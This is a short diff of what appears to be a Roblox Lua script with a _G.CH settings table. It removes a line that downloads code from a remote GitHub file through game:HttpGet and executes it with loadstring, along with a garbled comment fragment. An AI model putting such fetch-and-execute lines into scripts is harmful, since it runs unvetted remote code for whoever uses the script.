@@ -35,8 +35,6 @@ _G.CH = {
         Orientation= CFrame.Angles(math.rad(0),math.rad(0),math.rad(90))
     }
 }
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Nitro-GT/Oxide/refs/heads/main/Loadstring"))()
---Script Goes Here!0075, true)
 local playanother = false
 local playing = false
 local rtrnv;
